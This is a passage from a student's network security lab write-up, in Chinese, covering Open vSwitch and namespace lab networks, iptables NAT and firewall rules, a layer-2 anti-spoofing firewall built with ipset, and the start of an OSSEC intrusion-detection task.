<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ovs-vsctl add-br br0</span><br><span class="line"><span class="meta">#</span><span class="bash"> ovs-vsctl （） br0 tap1 tag=10 -- <span class="built_in">set</span> interface tap1 <span class="built_in">type</span>=internal</span></span><br><span class="line">ovs-vsctl add-port br0 tap1 tag=10 -- set interface tap1 type=internal</span><br><span class="line">ip link show</span><br><span class="line">ip netns add ns-tap1</span><br><span class="line">ip link set dev tap1 netns ns-tap1</span><br><span class="line">ip netns exec ns-tap1 ip link show</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; add-port</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200524184026990.png" alt="image-20200524184026990"></p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529220739232.png" alt="image-20200529220739232"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip netns exec ns-tap1 ip link set dev lo up #使有效</span><br><span class="line">ip netns exec ns-tap1 ip link set dev tap1 up</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529220807140.png" alt="image-20200529220807140"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip netns exec ns-tap1 ip addr add dev tap1 10.0.0.2/24</span><br><span class="line">ip netns exec ns-tap1 ip route add default via 10.0.0.1</span><br><span class="line">ip netns exec ns-tap1 ip addr show</span><br><span class="line">ip netns exec ns-tap1 ip route show</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529220851887.png" alt="image-20200529220851887"></p>
<p><strong>3、创建tag为11的内网2，方法同上</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ovs-vsctl add-port br0 tap2 tag=11 -- set interface tap2 type=internal</span><br><span class="line">ip link show</span><br><span class="line"><span class="meta">#</span><span class="bash">创建ns-tap2域</span></span><br><span class="line">ip netns add ns-tap2  </span><br><span class="line">ip link set dev tap2 netns ns-tap2</span><br><span class="line">ip netns exec ns-tap2 ip link show</span><br><span class="line"><span class="meta"> #</span><span class="bash">使有效</span></span><br><span class="line">ip netns exec ns-tap2 ip link set dev lo up</span><br><span class="line">ip netns exec ns-tap2 ip link set dev tap2 up</span><br><span class="line"></span><br><span class="line">ip netns exec ns-tap2 ip addr add dev tap2 10.0.1.2/24</span><br><span class="line">ip netns exec ns-tap2 ip route add default via 10.0.1.1</span><br><span class="line">ip netns exec ns-tap2 ip addr show</span><br><span class="line">ip netns exec ns-tap2 ip route show</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529222347549.png" alt="image-20200529222347549"></p>
<p><strong>4、查看网络内网1 与 内网2的连通性</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip netns</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529221550296.png" alt="image-20200529221550296"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ovs-vsctl show</span><br><span class="line">ip netns exec ns-tap1 ping -c 1 10.0.1.2</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529221622219.png" alt="image-20200529221622219"></p>
<p>经过测试，两个内网tap1、tap2是不通的。</p>
<p><strong>4、netns模拟器由器实现内网1与内网2互通</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ovs-vsctl add-port br0 r1 tag=10 -- set interface r1 type=internal</span><br><span class="line">ovs-vsctl add-port br0 r2 tag=11 -- set interface r2 type=internal</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529221729849.png" alt="image-20200529221729849"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">ip （） add router</span></span><br><span class="line">ip netns add router</span><br><span class="line">ip link set dev r1 netns router</span><br><span class="line">ip link set dev r2 netns router</span><br><span class="line">ip netns exec router ip link set dev lo up</span><br><span class="line">ip netns exec router ip link set dev r1 up</span><br><span class="line">ip netns exec router ip link set dev r2 up</span><br><span class="line">ip netns exec router ip addr add dev r1 10.0.0.1/24</span><br><span class="line">ip netns exec router ip addr add dev r2 10.0.1.1/24</span><br><span class="line">ip netns exec router ping -c 1 10.0.0.2</span><br><span class="line">ip netns exec router ping -c 1 10.0.1.2</span><br><span class="line">ip netns exec ns-tap1 ping -c 1 10.0.1.2</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; netns</span></span><br></pre></td></tr></table></figure>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200524185116264.png" alt="image-20200524185116264"></p>
<p>在路由器内ping两个内网都是通的,在内网1内ping内网2也是通的，实验环境搭建成功！</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529223809557.png" alt="image-20200529223809557"></p>
<h2 id="任务五-网络防火墙nat、防问控制实战"><a href="#任务五-网络防火墙nat、防问控制实战" class="headerlink" title="任务五 网络防火墙nat、防问控制实战"></a>任务五 网络防火墙nat、防问控制实战</h2><h3 id="5-1-任务描述"><a href="#5-1-任务描述" class="headerlink" title="5.1 任务描述"></a>5.1 任务描述</h3><p>本实验任务在任务四操作完成的基础上，主要完成以下内容：</p>
<ul>
<li>了解iptables  nat基础知识与常用配置，</li>
<li>进行网络防火墙访问控制的实战。</li>
</ul>
<p>通过完成本实验任务，要求学生掌握企业中简单的iptables防火墙的应用。</p>
<h3 id="5-1-实验目标"><a href="#5-1-实验目标" class="headerlink" title="5.1 实验目标"></a>5.1 实验目标</h3><ul>
<li>掌握iptables  nat的基础知识与常用配置的操作。</li>
<li>掌握简单的网络防火墙的访问控制操作。</li>
</ul>
<p>可以利用iptables加固企业网络。</p>
<h3 id="5-1-实验工具"><a href="#5-1-实验工具" class="headerlink" title="5.1 实验工具"></a>5.1 实验工具</h3><ul>
<li><a href="http://210.42.123.2:8088/doku.php?id=网络空间安全术语与概念:iptables" target="_blank" rel="noopener">iptables</a></li>
<li><a href="http://210.42.123.2:8088/doku.php?id=网络空间安全术语与概念:ip" target="_blank" rel="noopener">ip</a>(包含ip link、ip netns、ip addr等)</li>
</ul>
<h3 id="5-4-操作步骤"><a href="#5-4-操作步骤" class="headerlink" title="5.4 操作步骤"></a>5.4 操作步骤</h3><h4 id="1、iptables-nat基础知识"><a href="#1、iptables-nat基础知识" class="headerlink" title="1、iptables nat基础知识"></a>1、iptables nat基础知识</h4><h5 id="nat表需要的三个链"><a href="#nat表需要的三个链" class="headerlink" title="nat表需要的三个链:"></a>nat表需要的三个链:</h5><pre><code>PREROUTING:在数据包到达防火墙时进行路由判断之前的规则，作用是是否改变目的地址或者目的端口;
POSTROUTING:在数据包离开防火墙时进行路由判断，是否要改变源地址、源端口等;
INPUT:改变访问目的为主机的数据包源地址;
OUTPUT:改变主机发出去的数据包目的地址;</code></pre><h5 id="动作选项："><a href="#动作选项：" class="headerlink" title="动作选项："></a>动作选项：</h5><pre><code>REDIRECT: 将数据包重定向到其它或其它主机的某个端口;
SNAT: 源地址转换，改变数据包的源地址;
DNAT: 目的地址转换，改变数据包的目的地址;
MASQUERADE: ip智能伪装;</code></pre><h5 id="注意点"><a href="#注意点" class="headerlink" title="注意点:"></a>注意点:</h5><pre><code>PRERROUTING: DNAT、REDIRECT （路由之前）只支持-i，不支持-o。在作出路由之前，对目的地址进行修改;
POSTROUTING: SNAT、MASQUERADE （路由之后）只支持-o，不支持-i。在作出路由之后，对源地址进行修改;
OUTPUT: DNAT、REDIRECT （本机）DNAT和REDIRECT规则用来处理来自NAT主机的出站数据包;
INPUT: SNAT （本机）SNAT规则用来修改目的为本机的源地址;</code></pre><h4 id="2、nat常用配置"><a href="#2、nat常用配置" class="headerlink" title="2、nat常用配置"></a>2、nat常用配置</h4><p><strong>(1) 将源转换成路由器router的r2接口地址</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">ip netns <span class="built_in">exec</span> router iptables -t nat -A POSTROUTING -o r2 -j （）</span></span><br><span class="line"><span class="meta">#</span><span class="bash">外网IP地址不稳定的情况即可使用MASQUERADE(动态伪装),能够自动的寻找外网地址并改为当前正确的外网IP地址</span></span><br><span class="line">ip netns exec router iptables -t nat -A POSTROUTING -o r2 -j MASQUERADE </span><br><span class="line">ip netns exec ns-tap1 ping -c 1 10.0.1.2</span><br><span class="line">ip netns exec router iptables -t nat -nvL</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529225732763.png" alt="image-20200529225732763"></p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529225817720.png" alt="image-20200529225817720"></p>
<p><strong>(2) 打开两个终端利用tcpdump抓包分析</strong></p>
<pre><code>ip netns exec ns-tap1 ping -c 1 10.0.1.2
ip netns exec ns-tap2 tcpdump -nei tap2</code></pre><blockquote>
<p>注意：b操作需要ctrl + alt + f2切换到新的视图操作,验证后ctrl + c中止抓包，按ctrl + alt + f1回到a视图继续下面的实验</p>
</blockquote>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529230245339.png" alt="image-20200529230245339"></p>
<p><strong>(3) 配置SNAT</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip netns exec router iptables -t nat -F</span><br><span class="line"><span class="meta">#</span><span class="bash">ip netns <span class="built_in">exec</span> router iptables -t nat -A POSTROUTING -s 10.0.0.0/24 -o r2 -j （） —to 10.0.1.1</span></span><br><span class="line">ip netns exec router iptables -t nat -A POSTROUTING -s 10.0.0.0/24 -o r2 -j SNAT --to-source 10.0.1.1</span><br><span class="line">ip netns exec ns-tap1 ping -c 1 10.0.1.2</span><br><span class="line">ip netns exec router iptables -t nat -nvL</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529230332489.png" alt="image-20200529230332489"></p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529230611427.png" alt="image-20200529230611427"></p>
<p><strong>(4) 配置DNAT</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip netns exec router iptables -t nat -F</span><br><span class="line"><span class="meta">#</span><span class="bash">ip netns <span class="built_in">exec</span> router iptables -t nat -I （） -i r1 -p tcp —dport 80 -j DNAT —to-destination 10.0.1.2:80</span></span><br><span class="line">ip netns exec router iptables -t nat -I PREROUTING -i r1 -p tcp --dport 80 -j DNAT --to-destination 10.0.1.2:80</span><br><span class="line">ip netns exec ns-tap1 curl 'http://10.0.1.1'</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529231013485.png" alt="image-20200529231013485"></p>
<blockquote>
<p>注: 因本实验机未安装80服务,所以curl <code>http://10.0.1.1</code> 错误</p>
</blockquote>
<p><strong>(5) 重定向</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip netns exec router iptables -t nat -F</span><br><span class="line">ip netns exec router iptables -t nat -I PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 81</span><br><span class="line">ip netns exec ns-tap1 curl 'http://10.0.1.1'</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529231308313.png" alt="image-20200529231308313"></p>
<h4 id="3、网络防火墙"><a href="#3、网络防火墙" class="headerlink" title="3、网络防火墙"></a>3、网络防火墙</h4><p><strong>(1) 允许内网１访问内问２</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip netns exec router iptables -t nat -F</span><br><span class="line">ip netns exec router iptables -F</span><br><span class="line"><span class="meta">#</span><span class="bash">ip netns <span class="built_in">exec</span> router iptables -A （） -s 10.0.0/24 -d 10.0.1.0/24 -j ACCEPT</span></span><br><span class="line">ip netns exec router iptables -A FORWARD -s 10.0.0/24 -d 10.0.1.0/24 -j ACCEPT</span><br><span class="line">ip netns exec router iptables -nvL</span><br><span class="line">ip netns exec ns-tap1 ping -c 1 10.0.1.2</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注：有数据包匹配说明规则生效</p>
</blockquote>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529231832366.png" alt="image-20200529231832366"></p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529231853389.png" alt="image-20200529231853389"></p>
<p><strong>(2) 拒绝内网１访问内网２</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip netns exec router iptables -F</span><br><span class="line">ip netns exec router iptables -A FORWARD -s 10.0.0/24 -d 10.0.1.0/24 -j DROP</span><br><span class="line">ip netns exec ns-tap1 ping -c 1 10.0.1.2</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529232009984.png" alt="image-20200529232009984"></p>
<p><strong>(3) 拒绝内网１访问内网２的80服务</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip netns exec router iptables -F</span><br><span class="line">ip netns exec router iptables -A FORWARD -s 10.0.0/24 -d 10.0.1.0/24 -p tcp --dport 80 -j DROP</span><br><span class="line">ip netns exec ns-tap1 ping -c 1 10.0.1.2</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注：上图中需要按ctrl+c结束</p>
</blockquote>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529232118966.png" alt="image-20200529232118966"></p>
<h2 id="任务六、公有云中二层防火墙实现"><a href="#任务六、公有云中二层防火墙实现" class="headerlink" title="任务六、公有云中二层防火墙实现"></a>任务六、公有云中二层防火墙实现</h2><h3 id="6-1-任务描述"><a href="#6-1-任务描述" class="headerlink" title="6.1 任务描述"></a>6.1 任务描述</h3><p>本实验任务在前五个实验掌握的基础上，主要完成以下内容：</p>
<ul>
<li>利用前面学习到的虚拟化技术搭建复杂的网络实验场景；</li>
<li>进一步学习虚拟交换机openvwitch网络配置；</li>
<li>云计算中一种二层防火墙的实现；</li>
<li>利用ipset动态加载防火墙策略</li>
<li>巩固防火墙、虚拟网络知识</li>
</ul>
<p>通过完成本实验任务，要求学生掌握企业公有云中二层防火墙实现的一种方法。可以控制同网段虚拟机间的通信,也可以防止用户随意修改IP或者MAC地址。</p>
<h3 id="6-2-实验目标"><a href="#6-2-实验目标" class="headerlink" title="6.2 实验目标"></a>6.2 实验目标</h3><pre><code>利用虚拟化技术搭建复杂的网络实验场景
掌握云计算中一种二层防火墙的实验方法
进一步掌握iptables的使用</code></pre><h3 id="6-3-实验工具"><a href="#6-3-实验工具" class="headerlink" title="6.3 实验工具"></a>6.3 实验工具</h3><ul>
<li><a href="http://210.42.123.2:8088/doku.php?id=网络安全实验命令与工具:ovs-vsctl" target="_blank" rel="noopener">ovs-vsctl</a>(openvswitch软件提供)</li>
<li><a href="http://210.42.123.2:8088/doku.php?id=网络空间安全术语与概念:ip" target="_blank" rel="noopener">ip</a>(包含ip link、ip netns、ip addr等)</li>
<li><a href="http://210.42.123.2:8088/doku.php?id=网络安全实验命令与工具:brctl" target="_blank" rel="noopener">brctl</a></li>
<li><a href="http://210.42.123.2:8088/doku.php?id=网络安全实验命令与工具:modprobe" target="_blank" rel="noopener">modprobe</a></li>
<li><a href="http://210.42.123.2:8088/doku.php?id=网络安全实验命令与工具:ipset" target="_blank" rel="noopener">ipset</a></li>
</ul>
<h3 id="6-4-操作步骤"><a href="#6-4-操作步骤" class="headerlink" title="6.4 操作步骤"></a>6.4 操作步骤</h3><h4 id="1、实验网络修改"><a href="#1、实验网络修改" class="headerlink" title="1、实验网络修改"></a>1、实验网络修改</h4><p><strong>(1) 实验拓扑</strong></p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200529235233680.png" alt="image-20200529235233680"></p>
<p><strong>(2) 查看上个实验环境</strong></p>
<pre><code>ovs-vsctl show
ip netns</code></pre><p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200530000019256.png" alt="image-20200530000019256"></p>
<p><strong>(3) 清空配置</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">ovs-vsctl （） br0</span></span><br><span class="line">ovs-vsctl del-br br0</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200530105320467.png" alt="image-20200530105320467"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip netns del router</span><br><span class="line">ip netns del ns-tap1</span><br><span class="line">ip netns del ns-tap2</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200530000510773.png" alt="image-20200530000510773"></p>
<p><strong>(4) 搭建实验环境</strong></p>
<p> a、新建网桥br0</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ovs-vsctl add-br br0</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200530000534720.png" alt="image-20200530000534720"></p>
<p> b、配置内网1</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip link add qvo-tap1 type veth peer name qvb-tap1</span><br><span class="line">ip link set qvb-tap1 up</span><br><span class="line">ip link set qvo-tap1 up</span><br><span class="line">brctl addbr qbr-tap1</span><br><span class="line">ip link set qbr-tap1 up</span><br><span class="line">brctl addif qbr-tap1 qvb-tap1</span><br><span class="line">ovs-vsctl add-port br0 qvo-tap1 tag=10</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200530000631785.png" alt="image-20200530000631785"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip link add tap1 type veth peer name tap11</span><br><span class="line">brctl addif qbr-tap1 tap11</span><br><span class="line">ip link set tap11 up</span><br><span class="line">ip netns add ns-tap1</span><br><span class="line">ip link set dev tap1 netns ns-tap1</span><br><span class="line">ip netns exec ns-tap1 ip link set dev lo up</span><br><span class="line">ip netns exec ns-tap1 ip link set dev tap1 up</span><br><span class="line">ip netns exec ns-tap1 ip addr add dev tap1 10.0.0.2/24</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200530000645150.png" alt="image-20200530000645150"></p>
<p>c、配置内网2</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip link add qvo-tap2 type veth peer name qvb-tap2</span><br><span class="line">ip link set qvb-tap2 up</span><br><span class="line">ip link set qvo-tap2 up</span><br><span class="line">brctl addbr qbr-tap2</span><br><span class="line">ip link set qbr-tap2 up</span><br><span class="line">brctl addif qbr-tap2 qvb-tap2</span><br><span class="line">ovs-vsctl add-port br0 qvo-tap2 tag=10</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200530000702498.png" alt="image-20200530000702498"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip link add tap2 type veth peer name tap22</span><br><span class="line">brctl addif qbr-tap2 tap22</span><br><span class="line">ip link set tap22 up</span><br><span class="line">ip netns add ns-tap2</span><br><span class="line">ip link set dev tap2 netns ns-tap2</span><br><span class="line">ip netns exec ns-tap2 ip link set dev lo up</span><br><span class="line">ip netns exec ns-tap2 ip link set dev tap2 up</span><br><span class="line">ip netns exec ns-tap2 ip addr add dev tap2 10.0.0.3/24</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200530000719597.png" alt="image-20200530000719597"></p>
<p>d、测试二层同网段通信</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip netns exec ns-tap1 ping -c 1 10.0.0.3</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200530000744035.png" alt="image-20200530000744035"></p>
<p><strong>(5) 加载内核参数</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">modprobe br_netfilter</span><br><span class="line">ls /proc/sys/net/bridge</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200530000753710.png" alt="image-20200530000753710"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="built_in">echo</span> “net.bridge.bridge-nf-call-arptables = （）” &gt;&gt; /etc/sysctl.conf</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="built_in">echo</span> “net.bridge.bridge-nf-call-ip6tables = （）” &gt;&gt; /etc/sysctl.conf</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="built_in">echo</span> “net.bridge.bridge-nf-call-iptables = （）” &gt;&gt; /etc/sysctl.conf</span></span><br><span class="line">echo "net.bridge.bridge-nf-call-arptables = 1" &gt;&gt; /etc/sysctl.conf</span><br><span class="line">echo "net.bridge.bridge-nf-call-ip6tables = 1" &gt;&gt; /etc/sysctl.conf</span><br><span class="line">echo "net.bridge.bridge-nf-call-iptables = 1" &gt;&gt; /etc/sysctl.conf</span><br><span class="line"> sysctl -p</span><br><span class="line"> sysctl -a | egrep "bridge-nf-call-arptables|bridge-nf-call-iptables|bridge-nf-call-ip6tables"</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200530105807225.png" alt="image-20200530105807225"></p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200530110644608.png" alt="image-20200530110644608"></p>
<p><strong>(6) 二层防火墙配置</strong></p>
<p>a、把FORWARD链所有流量导入自定义链</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -N openvswitch-forward</span><br><span class="line">iptables -A FORWARD -j openvswitch-forward</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200530000838518.png" alt="image-20200530000838518"></p>
<p>b、添加内网1 in、out方向链表，将匹配到的physdev流量倒入进出链表</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -N openvswitch-i-tap1</span><br><span class="line">iptables -N openvswitch-o-tap1</span><br><span class="line">iptables -A openvswitch-forward -m physdev --physdev-out tap11 --physdev-is-bridged -j openvswitch-i-tap1</span><br><span class="line">iptables -A openvswitch-forward -m physdev --physdev-in tap11 --physdev-is-bridged -j openvswitch-o-tap1</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200530110710986.png" alt="image-20200530110710986"></p>
<p>c、添加内网1 in方向规则, 并将没有匹配的流量导入新链表，过滤源地址使用ipset管理</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -N openvswitch-fallback</span><br><span class="line">ipset create ipv4-tap1 hash:net</span><br><span class="line"><span class="meta">#</span><span class="bash">iptables -A openvswitch-i-tap1 -m <span class="built_in">set</span> --match-set () src -j RETURN</span></span><br><span class="line">iptables -A openvswitch-i-tap1 -m set --match-set ipv4-tap1 src -j RETURN</span><br><span class="line">iptables -A openvswitch-i-tap1 -j openvswitch-fallback</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200530105919774.png" alt="image-20200530105919774"></p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200530110725531.png" alt="image-20200530110725531"></p>
<p>d、添加内网1 out方向规则，将所有流量导入新的链过滤</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -N openvswitch-s-tap1</span><br><span class="line">iptables -A openvswitch-o-tap1 -j openvswitch-s-tap1</span><br><span class="line">iptables -A openvswitch-o-tap1 -j RETURN</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200530110738610.png" alt="image-20200530110738610"></p>
<p>e、添加内网1安全规则  #这里要编辑一下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tap1_ip=`ip netns exec ns-tap1 ip -o -f inet addr show tap1 | awk -F'/' '&#123;print $1&#125;'|awk '&#123;print $4&#125;'`</span><br><span class="line">tap1_mac=`ip netns exec ns-tap1 ip link show tap1 | grep "link/ether"|awk '&#123;print $2&#125;'`</span><br><span class="line">iptables -A openvswitch-s-tap1 -s $tap1_ip/32 -m mac --mac-source $tap1_mac -m comment --comment "Allow traffic from defined IP/MAC pairs." -j RETURN</span><br><span class="line">iptables -A openvswitch-s-tap1 -j DROP</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200530110815348.png" alt="image-20200530110815348"></p>
<p>f、拒绝未匹配的流量</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -A openvswitch-fallback -m comment --comment "Default drop rule for unmatched traffic." -j DROP</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200530110833932.png" alt="image-20200530110833932"></p>
<p>g、测试内网1与内网2的网络连通性</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip netns exec ns-tap1 ping -c 1 10.0.0.3</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200530110946932.png" alt="image-20200530110946932"></p>
<p>可以看到已经不通了, 二层防火墙策略已经生效。</p>
<p>h、ipset添加源地址内网2,验证连通性</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ipset add ipv4-tap1 10.0.0.3</span><br><span class="line">ipset list ipv4-tap1</span><br><span class="line">iptables -nvL</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200530111148267.png" alt="image-20200530111148267"></p>
<p>ipset是iptables的扩展,可以想像它是一个IP地址集合,可以动态的加载iptables规则的地址集, 有效提升iptables的查找效率。</p>
<p>i、验证内网1能否修改IP、MAC</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip netns exec ns-tap1 ip addr del dev tap1 10.0.0.2/24</span><br><span class="line">ip netns exec ns-tap1 ip addr add dev tap1 10.0.0.4/24</span><br><span class="line"> ip netns exec ns-tap1 ip addr del dev tap1 10.0.0.4/24</span><br><span class="line">ip netns exec ns-tap1 ip addr add dev tap1 10.0.0.2/24</span><br><span class="line">ip netns exec ns-tap1 ip link set dev tap1 address 16:f7:55:f5:d7:ac</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200530111218386.png" alt="image-20200530111218386"></p>
<blockquote>
<p>注: 每次实验的MAC地址不一样, 请自行使用自己实验中的MAC</p>
</blockquote>
<p>实验中的方式就是公有云中二层防火墙实现的一种方法。可以控制同网段虚拟机间的通信,也可以防止用户随意修改IP或者MAC地址。</p>
<h1 id="入侵检测实验"><a href="#入侵检测实验" class="headerlink" title="入侵检测实验"></a>入侵检测实验</h1><h2 id="任务一-在不同的操作系统环境下安装和配置OSSEC代理，构建入侵检测环境"><a href="#任务一-在不同的操作系统环境下安装和配置OSSEC代理，构建入侵检测环境" class="headerlink" title="任务一 在不同的操作系统环境下安装和配置OSSEC代理，构建入侵检测环境"></a>任务一 在不同的操作系统环境下安装和配置OSSEC代理，构建入侵检测环境</h2><h3 id="1-1-任务描述-1"><a href="#1-1-任务描述-1" class="headerlink" title="1.1 任务描述"></a>1.1 任务描述</h3><p>本实验任务基于真实企业网络环境，在三台服务器搭建的典型企业局域网环境中，主要完成以下内容：</p>
<pre><code>在Windows平台下安装和配置OSSEC代理。
在Linux平台下安装和配置OSSEC代理（这里已安装OSSEC代理，直接配置即可）。</code></pre><p>通过完成本实验任务，要求学生理解入侵检测的概念和工作原理，掌握在不同操作系统平台安装并配置OSSEC代理的方法，为后续的入侵检测工作搭建OSSEC的C/S环境基础。</p>
<h3 id="1-2-实验目标-1"><a href="#1-2-实验目标-1" class="headerlink" title="1.2 实验目标"></a>1.2 实验目标</h3><pre><code>理解OSSIM开源安全信息管理系统的概念、功能，以及与OSSEC的关系及原理。
理解OSSEC入侵检测系统的基本功能、C/S模式工作原理。
掌握在不同的操作系统平台安装并配置OSSEC代理的方法。</code></pre><p>通过安装和配置OSSEC代理，了解OSSEC入侵检测系统的架构、功能以及实现方式，具备构建入侵检测环境的能力。</p>
<h3 id="1-3-实验工具-1"><a href="#1-3-实验工具-1" class="headerlink" title="1.3 实验工具"></a>1.3 实验工具</h3><ul>
<li><a href="http://210.42.123.2:8088/doku.php?id=网络安全实验命令与工具:ossim" target="_blank" rel="noopener">ossim</a></li>
<li><a href="http://210.42.123.2:8088/doku.php?id=网络安全实验命令与工具:ossec" target="_blank" rel="noopener">ossec</a></li>
<li><a href="https://ossec-docs.readthedocs.io/en/latest/docs/manual/agent/agent-management.html#manage-agents-on-ossec-agents" target="_blank" rel="noopener">ossec官方手册</a></li>
<li><a href="http://210.42.123.2:8088/doku.php?id=网络安全实验命令与工具:putty" target="_blank" rel="noopener">putty</a></li>
<li><a href="http://210.42.123.2:8088/doku.php?id=网络安全实验命令与工具:firefox" target="_blank" rel="noopener">firefox</a></li>
</ul>
